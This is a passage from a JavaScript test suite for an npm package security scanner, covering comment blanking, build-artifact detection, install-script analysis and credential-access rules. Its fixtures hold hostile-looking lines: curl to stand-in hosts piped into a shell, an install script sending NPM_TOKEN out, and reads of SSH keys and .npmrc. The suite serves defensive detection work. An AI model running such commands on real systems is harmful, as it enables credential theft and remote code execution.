'use strict';

const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');

const { blankComments, blankErasedSyntax, excerpt, looksLikeBuildArtifact, scanPackageDir } = require('../lib/scanner');
const { mkTmpDir, writePackage } = require('./helpers');

describe('blankComments', () => {
  // The output is built by splicing blanks over the comment ranges, so the
  // cases that matter are the ones where a range is open at the end or
  // absent entirely.
  test('handles a comment left unterminated at end of file', () => {
    const src = 'a; /* never closed';
    const out = blankComments(src);
    assert.equal(out.length, src.length);
    assert.ok(!out.includes('closed'));
    assert.ok(out.startsWith('a; '));
  });

  test('returns the input unchanged when there is no comment', () => {
    const src = 'const a = 1;\nconst b = "https://example.com/x";\n';
    assert.equal(blankComments(src), src);
  });

  test('keeps every line break when a block comment spans lines', () => {
    const src = 'a /* one\ntwo\nthree */ b;';
    const out = blankComments(src);
    assert.equal(out.length, src.length);
    assert.equal(out.split('\n').length, src.split('\n').length);
    assert.ok(!out.includes('two'));
  });

  test('blanks // line comments but preserves length/newlines', () => {
    const src = "const x = 1; // require('https')\nconst y = 2;\n";
    const out = blankComments(src);
    assert.equal(out.split('\n').length, src.split('\n').length);
    assert.ok(!out.includes('https'));
    assert.ok(out.includes('const y = 2;'));
  });

  test('blanks /* */ block comments including JSDoc examples', () => {
    const src = [
      '/**',
      ' * example: fs.writeFileSync(x)',
      ' */',
      'function f() {}',
      '',
    ].join('\n');
    const out = blankComments(src);
    assert.ok(!out.includes('writeFileSync'));
    assert.ok(out.includes('function f() {}'));
  });

  test('does not blank inside string literals', () => {
    const src = "const s = 'this has // not a comment and /* not either */';\n";
    const out = blankComments(src);
    assert.equal(out, src);
  });

  test('handles escaped quotes inside strings without early termination', () => {
    const src = "const s = 'it\\'s // still a string';\nconst t = 2; // real comment\n";
    const out = blankComments(src);
    assert.ok(out.includes("const s = 'it\\'s // still a string';"));
    assert.ok(!out.includes('real comment'));
  });

  // Regression test for a real bug found while pressure-testing this tool
  // against lodash: a regex literal containing a quote character inside a
  // character class (e.g. lodash's own `/['\n\r\\]/g`) was previously
  // misread as opening an unterminated string, which desynced comment
  // detection for the rest of the file. An entire later JSDoc block with
  // an `fs.writeFileSync(...)` example then produced a false "filesystem
  // access" capability match. See the blankComments() doc comment in
  // scanner.js for the full account.
  test('does not desync on a regex literal containing a quote character', () => {
    const src = [
      "var reUnescapedString = /['\\n\\r\\\\]/g;",
      '/**',
      ' * example: fs.writeFileSync(x)',
      ' */',
      'function f() {}',
      '',
    ].join('\n');
    const out = blankComments(src);
    assert.ok(out.includes("var reUnescapedString = /['"), 'regex literal should be left intact');
    assert.ok(!out.includes('writeFileSync'), 'the JSDoc comment after the regex must still be blanked');
  });

  test('treats a real division after an identifier as division, not a regex', () => {
    const src = 'const half = total / 2; // divide\n';
    const out = blankComments(src);
    assert.ok(out.includes('const half = total / 2;'));
    assert.ok(!out.includes('divide'));
  });

  test('treats division after a function-call close paren as division, not a regex', () => {
    const src = 'foo() / 2; // still division\n';
    const out = blankComments(src);
    assert.ok(!out.includes('still division'));
  });

  // Regression test: a regex literal (containing a quote, same failure
  // shape as the lodash case above) immediately after a control-flow
  // condition close, e.g. `if (x) /re/`. Distinguishing regex-vs-division
  // by the last character alone is wrong here, since this `)` closes an
  // `if` condition, not a call.
  test('allows a regex literal right after a control-flow condition close, e.g. if (x) /re/', () => {
    const src = [
      'function check(x) {',
      "  if (x) /['\"]/.test(x);",
      '  /**',
      '   * example: fs.writeFileSync(y)',
      '   */',
      '  return 1;',
      '}',
      '',
    ].join('\n');
    const out = blankComments(src);
    assert.ok(out.includes("if (x) /['\"]/.test(x);"), 'the regex literal itself must be left intact');
    assert.ok(!out.includes('writeFileSync'), 'the JSDoc comment after it must still be blanked, not desynced');
  });

  test('still treats division after a plain (non-control-flow) group close as division', () => {
    const src = 'const r = (a + b) / 2; // divide\n';
    const out = blankComments(src);
    assert.ok(!out.includes('divide'));
  });

  test('allows a regex literal right after keywords that expect an expression (return, typeof, etc.)', () => {
    for (const src of [
      'function f(x) { return /foo/.test(x); } // trailing\n',
      "const t = typeof x === 'string' ? x : ''; y = typeof /re/; // trailing\n",
      'switch (x) { case /re/.test(y): break; } // trailing\n',
    ]) {
      const out = blankComments(src);
      assert.ok(!out.includes('trailing'), `comment after keyword-prefixed regex must be blanked: ${src}`);
    }
  });
});

describe('looksLikeBuildArtifact', () => {
  // Directory conventions taken from where the obfuscation signal actually
  // fired across 11,615 published packages. bundles/, fesm2022/ and esm2020/
  // are the Angular Package Format, coverage/ is an istanbul report.
  test('recognises machine-generated output directories found in the wild', () => {
    for (const f of ['bundles/x.umd.js', 'fesm2022/a.mjs', 'esm2020/lib/a.js', 'es/components/a.js',
      'coverage/lcov-report/prettify.js', '.yarn/releases/yarn-3.6.0.cjs', 'docs/scripts/prettify.js',
      'public/js/app.js', 'assets/js/v.js']) {
      assert.equal(looksLikeBuildArtifact(f), true, f);
    }
  });

  // lib/ and src/ were the two largest sources of unrecognised long lines and
  // are still deliberately not build output: both hold hand-authored code,
  // and a 39,000-character line in src/ is what this signal is for.
  test('does not swallow hand-authored directories or near-miss names', () => {
    for (const f of ['lib/application.js', 'src/pages/hebei.js', 'index.js', 'bin/cli',
      'scripts/postinstall.js', 'test/x.js', 'esmodule/a.js', 'description/a.js']) {
      assert.equal(looksLikeBuildArtifact(f), false, f);
    }
  });

  test('recognizes common bundler output paths', () => {
    assert.ok(looksLikeBuildArtifact('dist/index.js'));
    assert.ok(looksLikeBuildArtifact('core.min.js'));
    assert.ok(looksLikeBuildArtifact('dist/axios.min.js'));
    assert.ok(looksLikeBuildArtifact('umd/lib.js'));
    assert.ok(looksLikeBuildArtifact('foo.bundle.js'));
  });
  test('does not flag ordinary hand-authored source paths', () => {
    assert.ok(!looksLikeBuildArtifact('index.js'));
    assert.ok(!looksLikeBuildArtifact('lib/scanner.js'));
    assert.ok(!looksLikeBuildArtifact('src/helpers/format.js'));
  });
});

describe('scanPackageDir', () => {
  test('does not flag capabilities that only appear in comments', () => {
    const tmp = mkTmpDir('comment-fp');
    const dir = writePackage(tmp, 'pkg', { name: 'pkg', version: '1.0.0' }, {
      'index.js': [
        '// example: require("child_process").exec("rm -rf /")',
        '/* fs.writeFileSync("x", "y") */',
        'module.exports = { add: (a, b) => a + b };',
        '',
      ].join('\n'),
    });
    const manifest = scanPackageDir(dir);
    assert.equal(manifest.capabilities.exec.present, false);
    assert.equal(manifest.capabilities.filesystem.present, false);
    assert.equal(manifest.riskScore, 0);
  });

  test('still flags the same capability when it is real code, not a comment', () => {
    const tmp = mkTmpDir('comment-tp');
    const dir = writePackage(tmp, 'pkg', { name: 'pkg', version: '1.0.0' }, {
      'index.js': "const cp = require('child_process');\nmodule.exports = cp;\n",
    });
    const manifest = scanPackageDir(dir);
    assert.equal(manifest.capabilities.exec.present, true);
  });

  test('does not flag obfuscation for a minified dist bundle', () => {
    const tmp = mkTmpDir('minified');
    const longLine = 'x'.repeat(800) + ';';
    const dir = writePackage(tmp, 'pkg', { name: 'pkg', version: '1.0.0' }, {
      'dist/pkg.min.js': longLine,
    });
    const manifest = scanPackageDir(dir);
    assert.equal(manifest.capabilities.obfuscationSignal.present, false);
  });

  test('still flags obfuscation for a suspicious long line in ordinary source', () => {
    const tmp = mkTmpDir('obfuscated');
    const longLine = 'x'.repeat(800) + ';';
    const dir = writePackage(tmp, 'pkg', { name: 'pkg', version: '1.0.0' }, {
      'index.js': longLine,
    });
    const manifest = scanPackageDir(dir);
    assert.equal(manifest.capabilities.obfuscationSignal.present, true);
  });

  test('distinguishes install-triggering scripts from prepare/prepublish for the CRITICAL flag', () => {
    const tmp = mkTmpDir('prepare-vs-postinstall');
    const withPrepare = writePackage(
      tmp,
      'a',
      { name: 'a', version: '1.0.0', scripts: { prepare: 'husky' } },
      { 'index.js': "const https = require('https');\nconst t = process.env.NPM_TOKEN;\n" }
    );
    const withPostinstall = writePackage(
      tmp,
      'b',
      { name: 'b', version: '1.0.0', scripts: { postinstall: 'node setup.js' } },
      { 'index.js': "const https = require('https');\nconst t = process.env.NPM_TOKEN;\n" }
    );
    const aManifest = scanPackageDir(withPrepare);
    const bManifest = scanPackageDir(withPostinstall);
    assert.ok(
      !aManifest.riskFlags.some((f) => f.startsWith('CRITICAL')),
      'prepare-only script must not trigger the CRITICAL worm-pattern flag'
    );
    assert.ok(
      bManifest.riskFlags.some((f) => f.startsWith('CRITICAL')),
      'postinstall must still trigger the CRITICAL worm-pattern flag'
    );
    assert.ok(bManifest.riskScore > aManifest.riskScore);
  });

  // The scanner's input is untrusted by definition. A package could ship
  // one abnormally large file specifically to stall or exhaust a CI
  // runner's memory, independent of what the file's content actually does.
  // This is a resource-exhaustion / DoS hardening test, not a capability
  // detection test.
  test('skips a file above the size cap instead of reading it fully into memory, and records the skip', () => {
    const tmp = mkTmpDir('oversized-file');
    const dir = writePackage(tmp, 'pkg', { name: 'pkg', version: '1.0.0' }, {
      'index.js': 'module.exports = {};\n',
    });
    // 16 MB, above the 15 MB cap, written directly with fs to avoid
    // holding a 16 MB string as a test fixture value.
    const oversizedPath = path.join(dir, 'huge.js');
    const fd = fs.openSync(oversizedPath, 'w');
    fs.writeSync(fd, Buffer.alloc(16 * 1024 * 1024, 'x'));
    fs.closeSync(fd);

    const manifest = scanPackageDir(dir);
    assert.equal(manifest.capabilities.skippedLargeFiles.present, true);
    assert.equal(manifest.capabilities.skippedLargeFiles.count, 1);
    assert.equal(manifest.sourceFilesSkipped, 1);
    assert.ok(manifest.riskFlags.some((f) => f.includes('exceeded the size limit')));
    // The small, legitimate file in the same package must still be scanned
    // normally; the cap should only affect the oversized file.
    assert.equal(manifest.sourceFilesScanned, 1);
  });

  // A published npm package always has valid package.json (the registry
  // validates it at publish time), so one that exists but fails to parse
  // is a real anomaly, not routine noise to swallow silently.
  test('flags a package.json that exists but is not valid JSON', () => {
    const tmp = mkTmpDir('malformed-pkgjson');
    const dir = path.join(tmp, 'pkg');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'package.json'), '{ not valid json,,,');
    fs.writeFileSync(path.join(dir, 'index.js'), 'module.exports = {};\n');

    const manifest = scanPackageDir(dir);
    assert.equal(manifest.malformedPackageJson, true);
    assert.ok(manifest.riskFlags.some((f) => f.includes('not valid JSON')));
  });

  test('does not flag a package with no package.json at all', () => {
    const tmp = mkTmpDir('no-pkgjson');
    fs.mkdirSync(tmp, { recursive: true });
    fs.writeFileSync(path.join(tmp, 'index.js'), 'module.exports = {};\n');

    const manifest = scanPackageDir(tmp);
    assert.equal(manifest.malformedPackageJson, false);
    assert.ok(!manifest.riskFlags.some((f) => f.includes('not valid JSON')));
  });
});

// A declaration file emits no JavaScript and `import type` is erased by the
// compiler, so neither can acquire a capability at runtime. Found across
// 5,761 real packages: typescript read as having process execution from
// `import { ChildProcess } from 'child_process'` in a .d.ts.
describe('blankErasedSyntax', () => {
  test('erases import type regardless of file kind', () => {
    const out = blankErasedSyntax("import type { RequestOptions } from 'node:http';\n", 'src/x.ts');
    assert.ok(!out.includes('node:http'));
  });

  test('erases a plain import in a declaration file', () => {
    const out = blankErasedSyntax("import { ChildProcess } from 'child_process';\n", 'types/x.d.ts');
    assert.ok(!out.includes('child_process'));
  });

  test('erases a multi-line import and keeps line numbering intact', () => {
    const src = "import {\n  Socket\n} from 'net';\nexport {};\n";
    const out = blankErasedSyntax(src, 'x.d.ts');
    assert.ok(!out.includes("'net'"));
    assert.equal(out.split('\n').length, src.split('\n').length);
    assert.equal(out.length, src.length);
  });

  test('keeps a plain import outside a declaration file', () => {
    const out = blankErasedSyntax("import { Socket } from 'net';\n", 'src/x.ts');
    assert.ok(out.includes("'net'"));
  });

  // Blanking the whole file would be the same mistake as skipping test/:
  // require('./payload.d.ts') does execute, Node loads an unknown extension
  // as CommonJS.
  test('keeps require() and call sites inside a declaration file', () => {
    const src = "const cp = require('child_process');\nfs.readFileSync('/etc/passwd');\n";
    const out = blankErasedSyntax(src, 'x.d.ts');
    assert.ok(out.includes('child_process'));
    assert.ok(out.includes('readFileSync'));
  });
});

describe('excerpt', () => {
  // A minified bundle is one enormous line; its first 200 characters have
  // nothing to do with the match.
  test('centres the snippet on the match in a very long line', () => {
    const line = 'a'.repeat(600) + "process.binding('buffer')" + 'b'.repeat(600);
    const out = excerpt(line, line.indexOf('process.binding'));
    assert.ok(out.includes("process.binding('buffer')"));
    assert.ok(out.length <= 210);
  });

  test('leaves a short line alone', () => {
    assert.equal(excerpt("  const cp = require('cp');  ", 12), "const cp = require('cp');");
  });
});

describe('capability rules against shapes found in real packages', () => {
  test('a type-only import in a .d.ts does not grant process execution', () => {
    const tmp = mkTmpDir('dts-type-import');
    const dir = writePackage(tmp, 'pkg', { name: 'pkg', version: '1.0.0' }, {
      'index.js': 'module.exports = {};\n',
      'index.d.ts': "import { ExecOptions } from 'child_process';\nexport declare function sha(o: ExecOptions): string;\n",
    });
    assert.equal(scanPackageDir(dir).capabilities.exec.present, false);
  });

  test('real code smuggled into a .d.ts still counts', () => {
    const tmp = mkTmpDir('dts-payload');
    const dir = writePackage(tmp, 'pkg', { name: 'pkg', version: '1.0.0' }, {
      'index.js': "require('./payload.d.ts');\n",
      'payload.d.ts': "const cp = require('child_process');\ncp.exec('id');\n",
    });
    assert.equal(scanPackageDir(dir).capabilities.exec.present, true);
  });

  test('comparing a filename against .node is not loading native code', () => {
    const tmp = mkTmpDir('dot-node-compare');
    const dir = writePackage(tmp, 'pkg', { name: 'pkg', version: '1.0.0' }, {
      'index.js': "if (!source.endsWith('.node')) throw new Error('x');\n",
    });
    assert.equal(scanPackageDir(dir).capabilities.nativeFfi.present, false);
  });

  test('requiring a .node addon is loading native code', () => {
    const tmp = mkTmpDir('dot-node-load');
    const dir = writePackage(tmp, 'pkg', { name: 'pkg', version: '1.0.0' }, {
      'index.js': "module.exports = require('./build/Release/keytar.node');\n",
    });
    assert.equal(scanPackageDir(dir).capabilities.nativeFfi.present, true);
  });
});

// A lifecycle script's command runs on install but lives in package.json, so
// the directory walk never reaches it. Found by scanning 5,761 published
// packages: the one package in that corpus that beacons out on install,
// xhjxhjtestrce123, ran `curl http://<host>/?host=...` from both preinstall
// and postinstall and its manifest recorded no network capability at all.
describe('lifecycle script commands', () => {
  function pkg(scripts, files = { 'index.js': 'module.exports = {};\n' }) {
    const tmp = mkTmpDir('script-cmd');
    return scanPackageDir(writePackage(tmp, 'pkg', { name: 'pkg', version: '1.0.0', scripts }, files));
  }

  test('a curl in an install script is network access, and the URL is recorded', () => {
    const m = pkg({ preinstall: 'curl http://beacon.invalid/?host=x' });
    assert.equal(m.capabilities.network.present, true);
    assert.deepEqual(m.capabilities.network.endpoints, ['http://beacon.invalid/?host=x']);
  });

  test('inline JavaScript in node -e is scanned by the JavaScript rules', () => {
    const m = pkg({ postinstall: 'node -e "require(\'https\').get(process.env.NPM_TOKEN)"' });
    assert.equal(m.capabilities.network.present, true);
    assert.equal(m.capabilities.sensitiveTargets.present, true);
    assert.ok(m.riskFlags.some((f) => f.startsWith('CRITICAL')));
  });

  test('piping a download into a shell is both network and process execution', () => {
    const m = pkg({ postinstall: 'curl -sL https://x.invalid/i.sh | sh' });
    assert.equal(m.capabilities.network.present, true);
    assert.equal(m.capabilities.exec.present, true);
  });

  // `node postinstall.js || bash install.sh` was matching the pipe rule on
  // the second character of `||`, and it was that rule's only match across
  // 20,039 packages.
  test('a || fallback is not a pipe, but handing a script to a shell is still execution', () => {
    assert.equal(pkg({ postinstall: 'bash ./postinstall.sh' }).capabilities.exec.present, true);
    assert.equal(pkg({ postinstall: 'node postinstall.js || bash install.sh' }).capabilities.exec.present, true);
    assert.equal(pkg({ postinstall: 'node build.js || echo failed' }).capabilities.exec.present, false);
  });

  test('an ordinary build command grants nothing extra', () => {
    const m = pkg({ postinstall: 'node scripts/build.js' });
    assert.equal(m.capabilities.network.present, false);
    assert.equal(m.capabilities.exec.present, false);
    assert.equal(m.capabilities.dynamicEval.present, false);
  });

  test('a non-string scripts entry does not throw', () => {
    const tmp = mkTmpDir('script-bad');
    const dir = writePackage(tmp, 'pkg', { name: 'pkg', version: '1.0.0', scripts: { postinstall: { nested: true } } }, {
      'index.js': 'module.exports = {};\n',
    });
    const m = scanPackageDir(dir);
    assert.equal(m.capabilities.lifecycleScripts.installTriggering, false);
  });
});

// An executable in `bin` has no reason to carry a .js extension; the shell
// runs it through its shebang. Across a registry-wide sample, 502 of the
// 4,502 that ship an executable point bin at a file the extension filter
// never read, and re-reading those files gave 26 of them a capability the
// manifest had missed. turbo, bunyan, restify, rome and stylus are among
// them; four packages had no file read at all.
describe('executables and unreadable packages', () => {
  function pkg(pkgJson, files) {
    const tmp = mkTmpDir('bin-cov');
    return scanPackageDir(writePackage(tmp, 'pkg', Object.assign({ name: 'pkg', version: '1.0.0' }, pkgJson), files));
  }

  test('reads a bin target with no extension', () => {
    const m = pkg({ bin: { tool: './bin/tool' } }, {
      'index.js': 'module.exports = {};\n',
      'bin/tool': "#!/usr/bin/env node\nrequire('child_process').execSync('id');\n",
    });
    assert.equal(m.capabilities.exec.present, true);
  });

  test('reads an extension-less file with a node shebang even without a bin entry', () => {
    const m = pkg({}, {
      'index.js': 'module.exports = {};\n',
      'bin/cli': "#!/usr/bin/env node\nrequire('https');\n",
    });
    assert.equal(m.capabilities.network.present, true);
  });

  test('leaves an ordinary extension-less file alone', () => {
    const m = pkg({}, { 'index.js': 'module.exports = {};\n', LICENSE: 'MIT '.repeat(50) });
    assert.equal(m.sourceFilesScanned, 1);
  });

  // A bin entry is attacker-controlled text.
  test('does not follow a bin target that escapes the package', () => {
    const m = pkg({ bin: '../../../etc/passwd' }, { 'index.js': 'module.exports = {};\n' });
    assert.equal(m.sourceFilesScanned, 1);
  });

  test('does not throw when bin points at a file that was not shipped', () => {
    const m = pkg({ bin: { a: './missing' } }, { 'index.js': 'module.exports = {};\n' });
    assert.equal(m.sourceFilesScanned, 1);
  });

  // "Nothing was read" and "nothing was found" produce the same empty
  // manifest; 14% of a random registry sample reads that way.
  test('says so when no source file was read at all', () => {
    const m = pkg({}, { 'README.md': '# hi\n' });
    assert.equal(m.sourceFilesScanned, 0);
    assert.equal(m.capabilities.noReadableSource.present, true);
    assert.ok(m.riskFlags.some((f) => f.includes('nothing was scanned')));
  });

  test('stays quiet when there is source to read', () => {
    const m = pkg({}, { 'index.js': 'module.exports = {};\n' });
    assert.equal(m.capabilities.noReadableSource.present, false);
  });
});

// A postinstall that only prints a message still marked the package as
// running code at install time, which is one leg of the worm pattern.
// aethercall was CRITICAL on that basis alone.
describe('install commands that cannot execute anything', () => {
  function pkg(scripts, files = { 'index.js': "require('https'); const k = process.env.API_KEY;\n" }) {
    const tmp = mkTmpDir('inert');
    return scanPackageDir(writePackage(tmp, 'pkg', { name: 'pkg', version: '1.0.0', scripts }, files));
  }

  test('an echo-only postinstall is not install-time execution', () => {
    const m = pkg({ postinstall: "echo 'thanks for installing! run npm run setup'" });
    assert.equal(m.capabilities.lifecycleScripts.installTriggering, false);
    assert.ok(!m.riskFlags.some((f) => f.startsWith('CRITICAL')));
  });

  test('the command is still recorded for a reviewer to see', () => {
    const m = pkg({ postinstall: 'echo hi' });
    assert.equal(m.capabilities.lifecycleScripts.present, true);
    assert.equal(m.capabilities.lifecycleScripts.scripts.postinstall, 'echo hi');
  });

  test('redirection or chaining makes it live again', () => {
    assert.equal(pkg({ postinstall: 'echo x > ~/.profile' }).capabilities.lifecycleScripts.installTriggering, true);
    assert.equal(pkg({ postinstall: 'echo hi; node evil.js' }).capabilities.lifecycleScripts.installTriggering, true);
    assert.equal(pkg({ postinstall: 'echo `id`' }).capabilities.lifecycleScripts.installTriggering, true);
  });

  test('one live script among inert ones still counts', () => {
    const m = pkg({ preinstall: 'echo hi', postinstall: 'node setup.js' });
    assert.equal(m.capabilities.lifecycleScripts.installTriggering, true);
  });
});

// `new Function("return this")` is how bundlers reach the global object. The
// argument is a constant, so nothing an attacker chose is executed, and it
// was the whole of the dynamic-eval evidence for 122 of 11,235 packages.
describe('the globalThis polyfill is not dynamic code execution', () => {
  function pkg(src) {
    const tmp = mkTmpDir('global-poly');
    return scanPackageDir(writePackage(tmp, 'pkg', { name: 'pkg', version: '1.0.0' }, { 'index.js': src }));
  }

  test('a constant return-this argument does not count', () => {
    assert.equal(pkg('var g = g || new Function("return this")();\n').capabilities.dynamicEval.present, false);
    assert.equal(pkg("var g = new Function('return globalThis')();\n").capabilities.dynamicEval.present, false);
  });

  test('anything else passed to Function still counts', () => {
    assert.equal(pkg('var f = new Function("return " + input)();\n').capabilities.dynamicEval.present, true);
    assert.equal(pkg('var f = new Function(`return ${s}`)();\n').capabilities.dynamicEval.present, true);
    assert.equal(pkg('new Function("return this;fetch(x)")();\n').capabilities.dynamicEval.present, true);
  });
});

// A credential must appear as an actual access, not a mention. The rule was
// already true of env vars; across 11,615 published packages, 34 of the 75
// packages with this capability had no access at all, and a routine vite
// upgrade failed the gate on the string ".npmrc" inside a bundled list of
// config filenames.
describe('credential paths must be used, not just named', () => {
  function pkg(src) {
    const tmp = mkTmpDir('cred-ctx');
    return scanPackageDir(writePackage(tmp, 'pkg', { name: 'pkg', version: '1.0.0' }, { 'index.js': src }));
  }
  const present = (src) => pkg(src).capabilities.sensitiveTargets.present;

  test('counts a path that is opened or built', () => {
    assert.equal(present("fs.writeFileSync(path.resolve(os.homedir(), '.npmrc'), token);\n"), true);
    assert.equal(present("const p = path.join(dir, '.npmrc');\n"), true);
    assert.equal(present("const k = readFileSync(os.homedir() + '/.ssh/id_rsa');\n"), true);
  });

  test('ignores a path that is only named', () => {
    assert.equal(present('const list = [".npmrc", ".yarnrc"];\n'), false);
    assert.equal(present('const RE = /^\\.npmrc$/i;\n'), false);
    assert.equal(present('console.log("set the token in the project .npmrc");\n'), false);
    assert.equal(present('const glob = "**/id_rsa";\n'), false);
  });

  test('env credential rules are unaffected; they are already access-shaped', () => {
    assert.equal(present('const t = process.env.NPM_TOKEN;\n'), true);
  });

  // A minified bundle is one enormous line, so a context scoped to the whole
  // line is satisfied by anything anywhere in the file. @claudiolabs/claudin
  // was CRITICAL because its bundle carries '~/.ssh/config' in a CLI help
  // string and calls something ending in `open(` tens of kilobytes away.
  test('the path operation has to be near the path, not merely on the same line', () => {
    const far = 'const pad = "' + 'x'.repeat(400) + '";';
    assert.equal(present('openSync(a);\n' + far + '\nconst help = "a host alias from ~/.ssh/config";\n'), false);
    assert.equal(present('const h = "~/.ssh/id_rsa"; readFileSync(h);\n'), true);
  });
});

// Endpoints feed the diff, so junk glued to a URL literal shows up in a
// reviewer's report as a new endpoint. 1,919 of 31,128 endpoints extracted
// from 20,039 published packages carried some.
describe('network endpoint extraction', () => {
  function endpoints(src) {
    const tmp = mkTmpDir('endpoints');
    return scanPackageDir(writePackage(tmp, 'pkg', { name: 'pkg', version: '1.0.0' }, { 'index.js': src }))
      .capabilities.network.endpoints;
  }

  test('stops at an escape sequence rather than swallowing it', () => {
    assert.deepEqual(endpoints('const u = "http://localhost:3000\\n";\n'), ['http://localhost:3000']);
  });

  test('drops sentence punctuation glued to the end', () => {
    assert.deepEqual(endpoints('const m = "see https://example.com/docs.";\n'), ['https://example.com/docs']);
  });

  test('splits a comma-joined list into separate endpoints', () => {
    assert.deepEqual(endpoints('const m = "https://a.example.com/v1,https://b.example.com/v2";\n'),
      ['https://a.example.com/v1', 'https://b.example.com/v2']);
  });

  test('rejects a match whose host is not one', () => {
    assert.deepEqual(endpoints('const m = "https://.";\n'), []);
  });

  test('keeps localhost, a port, and an IPv4 host', () => {
    assert.deepEqual(endpoints('const u = "http://127.0.0.1:8080/api";\n'), ['http://127.0.0.1:8080/api']);
    assert.deepEqual(endpoints('const u = "http://localhost:3000";\n'), ['http://localhost:3000']);
  });
});

// `eval(` alone matched a property named eval and an identifier ending in
// one, since `$` is not a word character. 71 of 20,039 published packages
// had nothing else as their dynamic-eval evidence.
describe('eval must be eval', () => {
  function present(src) {
    const tmp = mkTmpDir('eval-scope');
    return scanPackageDir(writePackage(tmp, 'pkg', { name: 'pkg', version: '1.0.0' }, { 'index.js': src }))
      .capabilities.dynamicEval.present;
  }

  test('counts a real call, including the explicit global forms', () => {
    assert.equal(present('eval(scriptString);\n'), true);
    assert.equal(present('if (!eval(c)) { throw new Error("x"); }\n'), true);
    assert.equal(present('const r = window.eval(src);\n'), true);
    assert.equal(present('global.eval(code);\n'), true);
  });

  // puppeteer-core's $eval and $$eval are DOM query helpers, redis.eval runs
  // a Lua script on the server.
  test('ignores a property named eval and an identifier ending in one', () => {
    assert.equal(present('async $eval(selector, fn) { return fn(selector); }\n'), false);
    assert.equal(present('const res = __$$eval(expr);\n'), false);
    assert.equal(present('const r = await this.redis.eval(script, 1, key);\n'), false);
    assert.equal(present('page.eval(sel, fn);\n'), false);
  });
});

// The worm pattern needs credentials belonging to the environment a package
// is installed into, not the package's own service key. Across 20,039
// published packages the CRITICAL flag fired 37 times and 29 were the
// second kind: figma-image-exporter runs a postinstall, talks to
// api.figma.com and reads FIGMA_TOKEN.
describe('what counts as the worm pattern', () => {
  function flags(scripts, src) {
    const tmp = mkTmpDir('worm-shape');
    return scanPackageDir(writePackage(tmp, 'pkg', { name: 'pkg', version: '1.0.0', scripts }, { 'index.js': src }))
      .riskFlags;
  }
  const install = { postinstall: 'node setup.js' };

  test('reaching for the developer environment is CRITICAL', () => {
    const f = flags(install, "require('https'); const t = process.env.NPM_TOKEN;\n");
    assert.ok(f.some((x) => x.startsWith('CRITICAL')));
  });

  test('reading ~/.npmrc is too', () => {
    const f = flags(install, "require('https'); fs.readFileSync(path.join(os.homedir(), '.npmrc'));\n");
    assert.ok(f.some((x) => x.startsWith('CRITICAL')));
  });

  test("a package's own service key is HIGH, and says so", () => {
    const f = flags(install, "require('https'); const t = process.env.FIGMA_TOKEN;\n");
    assert.ok(!f.some((x) => x.startsWith('CRITICAL')));
    const high = f.find((x) => x.includes('credential-shaped'));
    assert.ok(high && high.startsWith('HIGH'));
  });

  test('no install script means neither', () => {
    const f = flags({}, "require('https'); const t = process.env.NPM_TOKEN;\n");
    assert.ok(!f.some((x) => x.startsWith('CRITICAL')));
  });
});

// npm strips a leading byte-order mark, so a BOM-prefixed package.json is a
// valid published package. All 6 of 20,039 that have one were being
// reported as malformed.
describe('package.json parsing', () => {
  test('accepts a byte-order mark', () => {
    const tmp = mkTmpDir('bom');
    const dir = path.join(tmp, 'pkg');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'package.json'), '\ufeff' + JSON.stringify({ name: 'p', version: '1.0.0' }));
    fs.writeFileSync(path.join(dir, 'index.js'), 'module.exports = {};\n');
    const m = scanPackageDir(dir);
    assert.equal(m.malformedPackageJson, false);
    assert.equal(m.name, 'p');
  });

  test('still reports genuinely invalid JSON', () => {
    const tmp = mkTmpDir('bad-json');
    const dir = path.join(tmp, 'pkg');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'package.json'), '{ "name": ');
    const m = scanPackageDir(dir);
    assert.equal(m.malformedPackageJson, true);
  });
});

// Only the commands a consumer actually runs contribute capabilities.
// Crediting the package for what `prepare` does would contradict scoring it
// lower for not running: glob's prepare is `tshy && bash scripts/build.sh`,
// and it made a routine glob 10 to 13 upgrade fail the gate.
describe('build-time scripts do not grant capabilities', () => {
  test('a prepare script that shells out is recorded but grants nothing', () => {
    const tmp = mkTmpDir('prepare-scope');
    const m = scanPackageDir(writePackage(tmp, 'pkg', {
      name: 'pkg', version: '1.0.0', scripts: { prepare: 'tshy && bash scripts/build.sh' },
    }, { 'index.js': 'module.exports = {};\n' }));
    assert.equal(m.capabilities.exec.present, false);
    assert.equal(m.capabilities.lifecycleScripts.scripts.prepare, 'tshy && bash scripts/build.sh');
    assert.equal(m.capabilities.lifecycleScripts.installTriggering, false);
  });

  test('the same command in postinstall does grant it', () => {
    const tmp = mkTmpDir('postinstall-scope');
    const m = scanPackageDir(writePackage(tmp, 'pkg', {
      name: 'pkg', version: '1.0.0', scripts: { postinstall: 'bash scripts/build.sh' },
    }, { 'index.js': 'module.exports = {};\n' }));
    assert.equal(m.capabilities.exec.present, true);
  });
});

// `node:fs`, `node:child_process` and `node:vm` are the documented modern
// spelling and were matched only in the network category. 1,322 of 23,806
// published packages, 5.6%, were missing a capability they genuinely have:
// 938 filesystem, 741 process execution.
describe('the node: module prefix', () => {
  function caps(src) {
    const tmp = mkTmpDir('node-prefix');
    return scanPackageDir(writePackage(tmp, 'pkg', { name: 'pkg', version: '1.0.0' }, { 'index.js': src }))
      .capabilities;
  }

  test('is process execution', () => {
    assert.equal(caps("const cp = require('node:child_process');\n").exec.present, true);
    assert.equal(caps("import { spawn } from 'node:child_process';\n").exec.present, true);
  });

  test('is filesystem access', () => {
    assert.equal(caps("const fs = require('node:fs');\n").filesystem.present, true);
    assert.equal(caps("import fs from 'node:fs/promises';\n").filesystem.present, true);
  });

  test('is dynamic code execution for vm', () => {
    assert.equal(caps("const vm = require('node:vm');\n").dynamicEval.present, true);
    assert.equal(caps("import { runInNewContext } from 'vm';\n").dynamicEval.present, true);
  });

  test('does not match a package that merely starts with node', () => {
    assert.equal(caps("require('nodefs');\n").filesystem.present, false);
    assert.equal(caps("require('vm2');\n").dynamicEval.present, false);
  });
});

// A package doing `require(deobfuscate(payload))` reported nothing at all:
// no capability, no flag, indistinguishable from an inert package. Whatever
// that module can do is not in the manifest, and that is worth saying.
describe('a module name we could not resolve', () => {
  function scan(src) {
    const tmp = mkTmpDir('unresolved');
    return scanPackageDir(writePackage(tmp, 'pkg', { name: 'pkg', version: '1.0.0' }, { 'index.js': src }));
